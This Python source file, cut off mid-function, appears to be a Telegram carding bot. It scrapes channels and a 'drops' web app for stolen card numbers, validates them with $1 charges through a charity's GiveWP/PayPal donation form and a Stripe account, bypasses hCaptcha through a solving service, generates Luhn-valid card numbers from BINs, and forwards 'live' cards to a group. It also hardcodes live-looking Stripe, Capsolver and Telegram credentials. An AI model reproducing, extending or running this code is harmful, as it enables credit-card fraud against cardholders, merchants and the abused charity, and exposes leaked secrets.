#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""

Author: Oxy
"""

import re
import asyncio
import logging
import os
import random
import json
import aiohttp
import requests
import time
import stripe
import hashlib
from datetime import datetime, timezone
from threading import Thread
from typing import Optional, Dict
import capsolver

# ----------------------------------------------------------------------
# Flask web server
# ----------------------------------------------------------------------
from flask import Flask, jsonify

flask_app = Flask(__name__)
BOT_USERNAME = "Oxy"
PORT = int(os.environ.get("PORT", 8080))
RUN_MODE = os.environ.get("RUN_MODE", "both").lower()

@flask_app.route('/')
def home():
    return jsonify({
        "status": "alive",
        "bot": BOT_USERNAME,
        "version": "13.0",
        "uptime": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "run_mode": RUN_MODE
    })

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "bot": BOT_USERNAME})

def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ----------------------------------------------------------------------
# Logging
# ----------------------------------------------------------------------
logging.basicConfig(
    filename="scraper.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger()

# ----------------------------------------------------------------------
# Configuration
# ----------------------------------------------------------------------
API_ID = 37079398
API_HASH = "678f499b4345b640ba83ed7b1fc1efc0"
SESSION_NAME = "mysession"

SOURCE_CHATS_RAW = [
    "https://t.me/+01N1N0nFYEA4MWRl",
    "newscrapper4",
    "cc_checker_Stuff"
]

FORWARD_TARGET = "OxyCondoneIt"
XFORCE_WEBAPP_URL = "https://t.me/xForceDropsBot/webapp?startapp=lchQoakh"

# Capsolver API key
CAPSOLVER_API_KEY = "CAP-AB1D4F1328B6EECA1ED6C2E538C4A9C45F0945D2407DDA96C8F3B7A472275EAD"
capsolver.api_key = CAPSOLVER_API_KEY

# Stripe configuration
STRIPE_SECRET_KEY = "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"
if STRIPE_SECRET_KEY:
    stripe.api_key = STRIPE_SECRET_KEY
    print("[✅] Stripe checker enabled")
else:
    print("[⚠️] Stripe checker disabled")

from telethon import TelegramClient, events
from telethon.errors import UserAlreadyParticipantError, FloodWaitError
from telethon.tl.functions.messages import ImportChatInviteRequest

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

# ----------------------------------------------------------------------
# Card patterns
# ----------------------------------------------------------------------
CARD_RE = re.compile(r"\b(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]\s*(\d{3,4})\b")
RANDOM_BINS = ["411111","424242","426684","431274","445564","456789","471496","489537",
               "512345","521234","536210","541333","552148","601100","601109","370000",
               "378282","356670","356986","356600","529062","551044","414720","405998","442756"]

# ----------------------------------------------------------------------
# BIN Database (simplified for brevity - add your full DB)
# ----------------------------------------------------------------------
BIN_DATABASE = {}

US_BANKS = {
    "414720": {"bank": "Chase Bank", "brand": "VISA", "type": "CREDIT", "country": "US", "country_code": "+1", "level": "SIGNATURE", "prepaid": False, "phone": "800-935-9935", "website": "chase.com"},
    "424242": {"bank": "Chase Bank", "brand": "VISA", "type": "DEBIT", "country": "US", "country_code": "+1", "level": "STANDARD", "prepaid": False, "phone": "800-935-9935", "website": "chase.com"},
    "411111": {"bank": "Capital One", "brand": "VISA", "type": "CREDIT", "country": "US", "country_code": "+1", "level": "SIGNATURE", "prepaid": False, "phone": "800-227-4825", "website": "capitalone.com"},
}

CANADIAN_BANKS = {}
UK_BANKS = {}
AUSTRALIAN_BANKS = {}
EUROPEAN_BANKS = {}
ASIAN_BANKS = {}

for db in [US_BANKS, CANADIAN_BANKS, UK_BANKS, AUSTRALIAN_BANKS, EUROPEAN_BANKS, ASIAN_BANKS]:
    BIN_DATABASE.update(db)

COUNTRIES = {
    "US": {"name": "United States", "flag": "🇺🇸", "currency": "USD", "code": "+1"},
    "CA": {"name": "Canada", "flag": "🇨🇦", "currency": "CAD", "code": "+1"},
    "GB": {"name": "United Kingdom", "flag": "🇬🇧", "currency": "GBP", "code": "+44"},
}

# ----------------------------------------------------------------------
# JSON storage
# ----------------------------------------------------------------------
DATA_FILE = "data.json"
_defaults = {"drops": [], "vouches": [], "banned": [], "stats": {"forwarded": 0, "charged": 0, "declined": 0, "errors": 0, "since": ""}}

def _load():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                data = json.load(f)
                for key, val in _defaults.items():
                    if key not in data:
                        data[key] = val.copy() if isinstance(val, dict) else list(val)
                    elif isinstance(val, dict):
                        for subkey, subval in val.items():
                            data[key].setdefault(subkey, subval)
                return data
        except:
            pass
    import copy
    return copy.deepcopy(_defaults)

def _save(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

def now_str():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

def add_drop(dropper, card):
    data = _load()
    data["drops"].append({"dropper": dropper, "card": card, "ts": now_str()})
    _save(data)
    return sum(1 for d in data["drops"] if d["dropper"] == dropper)

def get_leaderboard():
    data = _load()
    counts = {}
    for d in data["drops"]:
        counts[d["dropper"]] = counts.get(d["dropper"], 0) + 1
    return [{"name": name, "count": count} for name, count in sorted(counts.items(), key=lambda x: x[1], reverse=True)]

def add_vouch(from_user, for_user, note=""):
    data = _load()
    data["vouches"].append({"from": from_user, "for": for_user, "note": note, "ts": now_str()})
    _save(data)
    return sum(1 for v in data["vouches"] if v["for"].lower() == for_user.lower())

def get_vouches(for_user=""):
    data = _load()
    if for_user:
        return [v for v in data["vouches"] if v["for"].lower() == for_user.lower()]
    return data["vouches"]

def ban_user(username):
    data = _load()
    key = username.lower().lstrip("@")
    if key not in [b.lower() for b in data["banned"]]:
        data["banned"].append(key)
        _save(data)
        return True
    return False

def unban_user(username):
    data = _load()
    key = username.lower().lstrip("@")
    before = len(data["banned"])
    data["banned"] = [b for b in data["banned"] if b.lower() != key]
    if len(data["banned"]) < before:
        _save(data)
        return True
    return False

def get_banned():
    return _load().get("banned", [])

def record_forward_stat(stripe_status):
    data = _load()
    s = data["stats"]
    if not s.get("since"):
        s["since"] = now_str()
    s["forwarded"] = s.get("forwarded", 0) + 1
    if stripe_status == "CHARGED":
        s["charged"] = s.get("charged", 0) + 1
    elif stripe_status == "DECLINED":
        s["declined"] = s.get("declined", 0) + 1
    else:
        s["errors"] = s.get("errors", 0) + 1
    _save(data)

def get_stats():
    return _load().get("stats", {})

# ----------------------------------------------------------------------
# Helper functions
# ----------------------------------------------------------------------
def luhn_sum(card):
    total = 0
    for i, ch in enumerate(card[::-1]):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total

def generate_card_number(bin_prefix):
    bin_prefix = bin_prefix[:6]
    is_amex = bin_prefix[:2] in ("34", "37")
    length = 15 if is_amex else 16
    fill_len = length - len(bin_prefix) - 1
    body = bin_prefix + "".join(str(random.randint(0, 9)) for _ in range(fill_len))
    for check in range(10):
        candidate = body + str(check)
        if luhn_sum(candidate) % 10 == 0:
            return candidate
    return body + "0"

def generate_expiry():
    return f"{random.randint(1, 12):02d}", str(random.randint(2025, 2032))

def generate_cvv(card):
    return str(random.randint(1000, 9999)) if card[:2] in ("34", "37") else str(random.randint(100, 999))

def get_bin_info(bin_prefix):
    bin_prefix = bin_prefix[:6]
    if bin_prefix in BIN_DATABASE:
        return BIN_DATABASE[bin_prefix]
    return {
        "bank": "Unknown Bank", "brand": "UNKNOWN", "type": "UNKNOWN", "country": "Unknown",
        "level": "STANDARD", "prepaid": False, "phone": "N/A", "website": "N/A"
    }

async def get_bin_info_async(bin_prefix):
    bin_prefix = bin_prefix[:6]
    if bin_prefix in BIN_DATABASE:
        return BIN_DATABASE[bin_prefix]
    try:
        data = await lookup_bin_api(bin_prefix)
        if data:
            return {
                "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                "brand": data.get("scheme", "UNKNOWN").upper(),
                "type": data.get("type", "UNKNOWN").upper(),
                "country": data.get("country", {}).get("name", "Unknown"),
                "country_code": data.get("country", {}).get("alpha2", "XX"),
                "level": data.get("brand", "STANDARD").upper(),
                "prepaid": data.get("prepaid", False),
                "phone": "N/A",
                "website": "N/A"
            }
    except:
        pass
    return get_bin_info(bin_prefix)

def get_card_details(card_number, info=None):
    if info is None:
        info = get_bin_info(card_number[:6])
    return {
        "brand": info.get("brand", "UNKNOWN"),
        "type": info.get("type", "UNKNOWN"),
        "bank": info.get("bank", "Unknown Bank"),
        "country": info.get("country", "Unknown"),
        "level": info.get("level", "STANDARD"),
        "first6": card_number[:6],
        "last4": card_number[-4:],
        "length": len(card_number)
    }

def build_card_info_message(card, mm, yy, cvv, details, stripe_result=None):
    base = (f"┏━━━━━━━⍟\n┃ CARD INFO 💳 ({BOT_USERNAME})\n┗━━━━━━━━━━━⊛\n"
            f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}|{mm}|{yy}|{cvv}`\n"
            f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {details['brand']}\n"
            f"[❃] 𝗧𝘆𝗽𝗲   ➜ {details['type']}\n"
            f"[❃] 𝗕𝗮𝗻𝗸   ➜ {details['bank']}\n"
            f"[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {details['level']}\n"
            f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {details['country']}\n"
            f"[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {details['first6']}\n"
            f"[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {details['last4']}")
    if stripe_result:
        base += f"\n\n┏━━━━━━━⍟\n┃ STRIPE CHECK 💳\n┗━━━━━━━━━━━⊛\n{stripe_result}"
    return base

def build_bin_list_message(bin_prefix, data):
    country_info = COUNTRIES.get(data.get("country", ""), {})
    flag = country_info.get("flag", "🌍")
    country_name = country_info.get("name", data.get("country", "Unknown"))
    brand_emoji = {"VISA":"💳","MASTERCARD":"💳","AMEX":"💳","DISCOVER":"💳"}.get(data.get("brand","UNKNOWN"),"💳")
    type_emoji = {"CREDIT":"💎","DEBIT":"🏦","PREPAID":"🎫","CHARGE":"⚡","SECURED":"🔒"}.get(data.get("type","UNKNOWN"),"📇")
    prepaid_badge = " [PREPAID]" if data.get("prepaid") else ""
    return (f"┏━━━━━━━⍟\n┃ BIN LIST 📋 ({BOT_USERNAME})\n┗━━━━━━━━━━━⊛\n\n"
            f"{brand_emoji} **𝗕𝗜𝗡:** `{bin_prefix}`\n"
            f"🏦 **𝗕𝗮𝗻𝗸:** {data.get('bank', 'Unknown')}{prepaid_badge}\n"
            f"{type_emoji} **𝗧𝘆𝗽𝗲:** {data.get('type', 'Unknown')}\n"
            f"💳 **𝗕𝗿𝗮𝗻𝗱:** {data.get('brand', 'Unknown')}\n"
            f"🏆 **𝗟𝗲𝘃𝗲𝗹:** {data.get('level', 'STANDARD')}\n"
            f"{flag} **𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {country_name}\n"
            f"📞 **𝗣𝗵𝗼𝗻𝗲:** {data.get('phone', 'N/A')}\n"
            f"🌐 **𝗪𝗲𝗯𝘀𝗶𝘁𝗲:** {data.get('website', 'N/A')}\n"
            f"🔢 **𝗙𝗶𝗿𝘀𝘁 𝟲:** {bin_prefix}\n"
            f"🔢 **𝗟𝗮𝘀𝘁 𝟰:** * * * *\n\n✨ _Data from BIN database v13.0_")

async def lookup_bin_api(bin6):
    url = f"https://lookup.binlist.net/{bin6}"
    headers = {"Accept-Version": "3"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json(content_type=None)
                return {}
    except:
        return {}

# ----------------------------------------------------------------------
# PAYPAL CHECKER
# ----------------------------------------------------------------------
class PayPalCharger:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def _get_form_data(self):
        self.session.get("https://binnaclehouse.org/donation/", timeout=15)
        r = self.session.get("https://binnaclehouse.org/?givewp-route=donation-form-view&form-id=3945", timeout=20)
        r.raise_for_status()
        m = re.search(r"window\.givewpDonationFormExports\s*=\s*(\{.*?\});\s*[\n\r]", r.text, re.S)
        if not m:
            raise RuntimeError("givewpDonationFormExports block not found")
        blob = m.group(1)
        def _extract(key):
            match = re.search(rf'"{key}"\s*:\s*"([^"]+)"', blob)
            return match.group(1).replace("\\/", "/") if match else ""
        nonce = _extract("donationFormNonce")
        client_id = _extract("clientId")
        if not nonce or not client_id:
            raise RuntimeError("Missing nonce or clientId")
        return {"nonce": nonce, "client_id": client_id}

    def _create_order(self, nonce):
        resp = self.session.post(
            "https://binnaclehouse.org/wp-admin/admin-ajax.php",
            params={"action": "give_paypal_commerce_create_order"},
            data={"give-honeypot": "", "give-form-id": "3945", "give-form-hash": nonce,
                  "give-form-id-prefix": "give-3945-0", "give-amount": "1.00",
                  "give-gateway": "paypal-commerce", "payment-mode": "paypal-commerce"},
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=20,
        )
        res = resp.json()
        if res.get("success") and "data" in res:
            return res["data"]["id"]
        raise RuntimeError("Order creation failed")

    def _submit_payment(self, order_id, n, mm, yy, cvc, donor):
        ua = self.session.headers["User-Agent"]
        headers = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "X-App-Name": "standardcardfields",
            "Paypal-Client-Metadata-Id": order_id,
            "User-Agent": ua,
            "Content-Type": "application/json",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
        }
        query = """
        mutation payWithCard($token: String! $card: CardInput $phoneNumber: String
            $firstName: String $lastName: String $shippingAddress: AddressInput
            $billingAddress: AddressInput $email: String) {
            approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber
                firstName: $firstName lastName: $lastName email: $email
                shippingAddress: $shippingAddress billingAddress: $billingAddress) {
                flags { is3DSecureRequired } cart { cartId }
            }
        }"""
        address = {"givenName": donor["first_name"], "familyName": donor["last_name"],
                   "line1": "5112 N Tongass Hwy", "city": "Ketchikan", "state": "AK",
                   "postalCode": "99901", "country": "US"}
        card_type = "VISA" if n.startswith("4") else "MASTER_CARD" if n.startswith(("5","2")) else "AMEX"
        full_year = yy if len(yy) == 4 else f"20{yy}"
        variables = {
            "token": order_id,
            "card": {"cardNumber": n, "type": card_type, "expirationDate": f"{mm}/{full_year}",
                     "postalCode": "99901", "securityCode": cvc},
            "phoneNumber": "4969615048",
            "firstName": donor["first_name"],
            "lastName": donor["last_name"],
            "email": donor["email"],
            "billingAddress": address,
            "shippingAddress": address,
        }
        paypal_session = requests.Session()
        paypal_session.headers.update({"User-Agent": ua})
        resp = paypal_session.post(
            "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
            headers=headers, json={"query": query, "variables": variables}, timeout=45
        )
        if not resp.text.strip():
            return "DECLINED|PayPal empty response"
        res = resp.json()
        if "errors" in res:
            err_msg = res["errors"][0].get("message", "Unknown")
            if any(k in err_msg.upper() for k in ["INSUFFICIENT", "DO_NOT_HONOR", "CVV", "3D"]):
                return f"APPROVED|{err_msg}"
            return f"DECLINED|{err_msg}"
        if res.get("data", {}).get("approveGuestPaymentWithCreditCard"):
            return "CHARGED|Payment successful"
        return "DECLINED|Unknown response"

    def charge(self, cc):
        parts = cc.strip().split("|")
        if len(parts) < 4:
            return "ERROR|Invalid format"
        n, mm, yy, cvc = parts[:4]
        if len(yy) == 4:
            yy = yy[2:]
        donor = {"first_name": "William", "last_name": "Dives",
                 "email": f"william.dives{random.randint(100,999)}@gmail.com"}
        try:
            form_data = self._get_form_data()
            order_id = self._create_order(form_data["nonce"])
            return self._submit_payment(order_id, n, mm, yy, cvc, donor)
        except Exception as e:
            return f"ERROR|{str(e)}"

# ----------------------------------------------------------------------
# STRIPE $1 CHARGE CHECKER
# ----------------------------------------------------------------------
STRIPE_PK = "pk_live_51TTpO0R4rVHWehP7bCsxgS29XfhknzMhoUMQMNHfUKnsZEeWljYpQ99F0v7xJTj7Fw7s0u3cETyCmWdlRgM6f0JM006rTC6SIy"

class StripeChargeChecker:
    def check(self, cc):
        if not STRIPE_SECRET_KEY:
            return ("ERROR", "Stripe: Missing API key")
        parts = cc.strip().split("|")
        if len(parts) < 4:
            return ("ERROR", "Invalid format")
        n, mm, yy, cvc = parts[:4]
        if len(yy) == 2:
            yy = f"20{yy}"
        if len(mm) == 1:
            mm = f"0{mm}"
        try:
            resp = requests.post(
                "https://api.stripe.com/v1/tokens",
                auth=(STRIPE_PK, ""),
                data={
                    "card[number]": n,
                    "card[exp_month]": mm,
                    "card[exp_year]": yy,
                    "card[cvc]": cvc,
                },
                timeout=15
            )
            token_data = resp.json()
            if "error" in token_data:
                raise Exception(token_data["error"].get("message", "Tokenization failed"))
            token = token_data["id"]
            pm = stripe.PaymentMethod.create(type="card", card={"token": token})
            pi = stripe.PaymentIntent.create(
                amount=100,
                currency="usd",
                payment_method=pm.id,
                confirm=True,
                off_session=True,
                description="Card verification charge",
            )
            if pi.status == "succeeded":
                try:
                    refund = stripe.Refund.create(payment_intent=pi.id)
                    refund_status = "Refunded ✅" if refund.status == "succeeded" else f"Refund {refund.status}"
                except Exception as re:
                    refund_status = f"Refund failed: {str(re)[:40]}"
                return ("CHARGED", f"$1.00 charged + {refund_status} | {pm.card.brand.upper()} *{pm.card.last4}")
            elif pi.status in ("requires_action", "requires_payment_method"):
                return ("DECLINED", "Requires authentication / invalid card")
            else:
                return ("DECLINED", f"{pi.status}")
        except stripe.error.CardError as e:
            return ("DECLINED", f"{e.user_message}")
        except Exception as e:
            return ("ERROR", f"{str(e)}")

# ----------------------------------------------------------------------
# XFORCE WEBAPP MONITOR (hCaptcha bypass + auto-click)
# ----------------------------------------------------------------------
from playwright.async_api import async_playwright

class XForceMonitor:
    def __init__(self):
        self.processed_drops = set()
        self.running = True

    async def solve_hcaptcha(self, page):
        try:
            captcha_frame = await page.query_selector('iframe[src*="hcaptcha"]')
            if not captcha_frame:
                return True
            
            sitekey = await page.evaluate("""
                () => {
                    const elem = document.querySelector('.h-captcha');
                    return elem ? elem.getAttribute('data-sitekey') : null;
                }
            """)
            
            if not sitekey:
                sitekey = await page.evaluate("""
                    () => {
                        const iframe = document.querySelector('iframe[src*="hcaptcha"]');
                        if (iframe && iframe.src) {
                            const match = iframe.src.match(/sitekey=([^&]+)/);
                            return match ? match[1] : null;
                        }
                        return null;
                    }
                """)
            
            if sitekey:
                print(f"[XForce] Solving hCaptcha with sitekey: {sitekey}")
                solution = capsolver.solve({
                    "type": "HCaptchaTaskProxyless",
                    "websiteURL": page.url,
                    "websiteKey": sitekey,
                })
                await page.evaluate(f"""
                    () => {{
                        const response = '{solution["gRecaptchaResponse"]}';
                        const respElement = document.querySelector('[name="h-captcha-response"]');
                        if (respElement) respElement.innerHTML = response;
                        const event = new Event('submit', {{ bubbles: true }});
                        const captchaElem = document.querySelector('.h-captcha');
                        if (captchaElem) captchaElem.dispatchEvent(event);
                    }}
                """)
                print("[XForce] hCaptcha solved")
                await page.wait_for_timeout(2000)
                return True
            return True
        except Exception as e:
            print(f"[XForce] hCaptcha error: {e}")
            return False

    async def extract_cards_from_page(self, page):
        card_data = []
        try:
            content = await page.content()
            matches = CARD_RE.findall(content)
            for match in matches:
                card_str = f"{match[0]}|{match[1]}|{match[2]}|{match[3]}"
                if card_str not in self.processed_drops:
                    card_data.append(card_str)
                    self.processed_drops.add(card_str)
            
            view_buttons = await page.query_selector_all('button:has-text("View Drop"), a:has-text("View Drop"), [data-action="view-drop"], .view-drop')
            for button in view_buttons:
                if await button.is_visible():
                    await button.click()
                    await page.wait_for_timeout(1500)
                    modal_content = await page.text_content('.modal, .popup, .drop-details, .card-info')
                    if modal_content:
                        modal_matches = CARD_RE.findall(modal_content)
                        for match in modal_matches:
                            card_str = f"{match[0]}|{match[1]}|{match[2]}|{match[3]}"
                            if card_str not in self.processed_drops:
                                card_data.append(card_str)
                                self.processed_drops.add(card_str)
                    close_btn = await page.query_selector('.close, .modal-close, button:has-text("Close")')
                    if close_btn:
                        await close_btn.click()
                    await page.wait_for_timeout(500)
            return card_data
        except Exception as e:
            print(f"[XForce] Extract error: {e}")
            return []

    async def monitor(self, bot_client, target_group):
        print(f"[XForce] Starting webapp monitor: {XFORCE_WEBAPP_URL}")
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=False)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                viewport={'width': 1280, 'height': 720}
            )
            page = await context.new_page()
            await page.goto(XFORCE_WEBAPP_URL, wait_until="networkidle")
            print("[XForce] Webapp loaded")
            await page.wait_for_timeout(5000)
            
            authorize_btn = await page.query_selector('button:has-text("Authorize"), button:has-text("Start"), button:has-text("Open")')
            if authorize_btn:
                await authorize_btn.click()
                await page.wait_for_timeout(3000)
            
            while self.running:
                try:
                    await self.solve_hcaptcha(page)
                    cards = await self.extract_cards_from_page(page)
                    
                    for card_str in cards:
                        parts = card_str.split("|")
                        if len(parts) >= 4:
                            n, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                            bin_info = await get_bin_info_async(n[:6])
                            details = get_card_details(n, bin_info)
                            print(f"[XForce] Card found: {n[:4]}****{n[-4:]}")
                            stripe_checker = StripeChargeChecker()
                            stripe_status, stripe_message = await asyncio.get_event_loop().run_in_executor(
                                None, stripe_checker.check, card_str
                            )
                            if stripe_status == "CHARGED":
                                stripe_display = f"💰 CHARGED+REFUNDED | {stripe_message}"
                            elif stripe_status == "APPROVED":
                                stripe_display = f"🟢 APPROVED | {stripe_message}"
                            elif stripe_status == "DECLINED":
                                stripe_display = f"🔴 DECLINED | {stripe_message}"
                            else:
                                stripe_display = f"⚠️ {stripe_status} | {stripe_message}"
                            card_info = build_card_info_message(n, mm, yy, cvv, details, stripe_display)
                            await bot_client.send_message(target_group, card_info)
                            record_forward_stat(stripe_status)
                            print(f"[XForce] Forwarded: {n[:4]}****{n[-4:]} -> {stripe_status}")
                            await asyncio.sleep(1)
                    
                    await page.reload()
                    await page.wait_for_timeout(10000)
                except Exception as e:
                    print(f"[XForce] Monitor error: {e}")
                    await asyncio.sleep(15000)
            await browser.close()

# ----------------------------------------------------------------------
# Telegram bot handlers
# ----------------------------------------------------------------------
async def join_and_resolve(chat):
    if chat.startswith("+") or "t.me/+" in chat or "joinchat" in chat:
        invite = chat.lstrip("+")
        if "t.me/+" in chat:
            invite = chat.split("t.me/+")[-1]
        elif "joinchat/" in chat:
            invite = chat.split("joinchat/")[-1]
        try:
            result = await client(ImportChatInviteRequest(invite))
            return result.chats[0]
        except UserAlreadyParticipantError:
            async for dialog in client.iter_dialogs():
                if hasattr(dialog.entity, "title"):
                    return dialog.entity
            return None
        except Exception as e:
            logger.error(f"Join failed for {chat}: {e}")
            return None
    else:
        try:
            return await client.get_entity(chat)
        except Exception as e:
            logger.error(f"Resolve failed for {chat}: {e}")
            return None

async def check_card(gateway, card_str, gateway_name):
    loop = asyncio.get_event_loop()
    if gateway == "pp":
        result = await loop.run_in_executor(None, PayPalCharger().charge, card_str)
        status, _, detail = result.partition("|")
        return status.strip().upper(), detail
    elif gateway == "chg1":
        checker = StripeChargeChecker()
        status, message = await loop.run_in_executor(None, checker.check, card_str)
        return status, message
    else:
        return "ERROR", "Unknown gateway"

async def run_scraper():
    await client.start()
    print(f"[{BOT_USERNAME}] Bot online")
    print(f"Watching: {SOURCE_CHATS_RAW}")
    print(f"Forwarding to: {FORWARD_TARGET}")
    print(f"XForce webapp monitor starting...")

    # Start XForce monitor
    xforce_monitor = XForceMonitor()
    asyncio.create_task(xforce_monitor.monitor(client, FORWARD_TARGET))

    resolved = []
    for chat in SOURCE_CHATS_RAW:
        entity = await join_and_resolve(chat)
        if entity:
            resolved.append(entity)
            print(f"Watching: {entity.title if hasattr(entity, 'title') else chat}")
        else:
            print(f"Could not resolve: {chat}")

    if not resolved:
        print("No channels resolved.")
        return

    forwarded_hashes = set()
    
    @client.on(events.NewMessage(chats=resolved))
    async def forward_cards(event):
        text = event.raw_text or ""
        m = CARD_RE.search(text)
        if not m:
            return
        card_data = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        card_hash = hashlib.md5(card_data.encode()).hexdigest()
        if card_hash in forwarded_hashes:
            return
        forwarded_hashes.add(card_hash)
        if len(forwarded_hashes) > 1000:
            forwarded_hashes.clear()
        
        n, mm, yy, cvv = m.group(1), m.group(2), m.group(3), m.group(4)
        bin_info = await get_bin_info_async(n[:6])
        details = get_card_details(n, bin_info)
        print(f"[Source] Charging $1: {n[:4]}****{n[-4:]}")
        stripe_status, stripe_message = await check_card("chg1", card_data, "Stripe $1")
        if stripe_status == "CHARGED":
            stripe_display = f"💰 CHARGED+REFUNDED | {stripe_message}"
        elif stripe_status == "APPROVED":
            stripe_display = f"🟢 APPROVED | {stripe_message}"
        elif stripe_status == "DECLINED":
            stripe_display = f"🔴 DECLINED | {stripe_message}"
        else:
            stripe_display = f"⚠️ {stripe_status} | {stripe_message}"
        card_info = build_card_info_message(n, mm, yy, cvv, details, stripe_display)
        try:
            await client.send_message(FORWARD_TARGET, card_info)
            record_forward_stat(stripe_status)
            print(f"[Source] Forwarded: {n[:4]}****{n[-4:]} -> {stripe_status}")
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            logger.error(f"Forward error: {e}")

    # ----- COMMAND HANDLERS -----
    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/gen(?:\s+(\S+))?"))
    async def gen_cmd(event):
        match = event.pattern_match
        bin_input = match.group(1) if match.group(1) else ""
        bin_digits = re.sub(r"\D", "", bin_input)
        if len(bin_digits) >= 6:
            bin_prefix = bin_digits[:6]
        elif len(bin_digits) >= 1:
            await event.edit("Need 6+ digits")
            return
        else:
            bin_prefix = random.choice(RANDOM_BINS)
        card = generate_card_number(bin_prefix)
        mm, yy = generate_expiry()
        cvv = generate_cvv(card)
        details = get_card_details(card)
        await event.edit(build_card_info_message(card, mm, yy, cvv, details))

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/bin(?:\s+(\S+))?"))
    async def bin_cmd(event):
        match = event.pattern_match
        raw = match.group(1) if match.group(1) else ""
        bin_digits = re.sub(r"\D", "", raw)[:6]
        if len(bin_digits) < 6:
            await event.edit("Usage: /bin 456789\nFor local DB use /binlist")
            return
        await event.edit("Looking up BIN via API...")
        data = await lookup_bin_api(bin_digits)
        if not data:
            await event.edit(f"No data for BIN `{bin_digits}`. Try /binlist {bin_digits}")
            return
        scheme = data.get("scheme", "Unknown").upper()
        kind = data.get("type", "Unknown").capitalize()
        bank = data.get("bank", {}).get("name", "Unknown")
        country = data.get("country", {}).get("name", "Unknown")
        flag = data.get("country", {}).get("emoji", "🌍")
        reply = (f"┏━━━━━━━⍟\n┃ BIN LOOKUP 🔍\n┗━━━━━━━━━━━⊛\n"
                 f"[❃] 𝗕𝗜𝗡    ➜ `{bin_digits}`\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bank}\n"
                 f"[❃] 𝗦𝗰𝗵𝗲𝗺𝗲 ➜ {scheme}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {kind}\n"
                 f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {flag} {country}")
        await event.edit(reply)

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/binlist(?:\s+(\S+))?"))
    async def binlist_cmd(event):
        match = event.pattern_match
        raw = match.group(1) if match.group(1) else ""
        bin_digits = re.sub(r"\D", "", raw)[:6]
        if len(bin_digits) < 6:
            await event.edit("Usage: /binlist 456789")
            return
        info = get_bin_info(bin_digits)
        if info["bank"] == "Unknown Bank":
            api_info = await lookup_bin_api(bin_digits)
            if api_info:
                scheme = api_info.get("scheme", "Unknown").upper()
                kind = api_info.get("type", "Unknown").capitalize()
                bank = api_info.get("bank", {}).get("name", "Unknown")
                country = api_info.get("country", {}).get("name", "Unknown")
                flag = api_info.get("country", {}).get("emoji", "🌍")
                reply = (f"┏━━━━━━━⍟\n┃ BIN LIST 📋 ({BOT_USERNAME})\n┗━━━━━━━━━━━⊛\n\n"
                         f"💳 **𝗕𝗜𝗡:** `{bin_digits}`\n🏦 **𝗕𝗮𝗻𝗸:** {bank}\n"
                         f"💎 **𝗕𝗿𝗮𝗻𝗱:** {scheme}\n📇 **𝗧𝘆𝗽𝗲:** {kind}\n"
                         f"{flag} **𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {country}\n\nNot in local database. Showing API results.")
                await event.edit(reply)
            else:
                await event.edit(f"BIN `{bin_digits}` not found. Try /bin {bin_digits}")
            return
        await event.edit(build_bin_list_message(bin_digits, info))

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/chkpp(?:\s+(.+))?"))
    async def chkpp_cmd(event):
        match = event.pattern_match
        raw = (match.group(1) or "").strip()
        if not raw or not CARD_RE.search(raw):
            await event.edit("Usage: /chkpp 4111111111111111|12|27|123")
            return
        m = CARD_RE.search(raw)
        card_str = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        await event.edit("Checking via PayPal...")
        status, detail = await check_card("pp", card_str, "PayPal")
        if status == "CHARGED":
            badge = "CHARGED 💰"
        elif status == "APPROVED":
            badge = "APPROVED 🟢"
        elif status == "DECLINED":
            badge = "DECLINED 🔴"
        else:
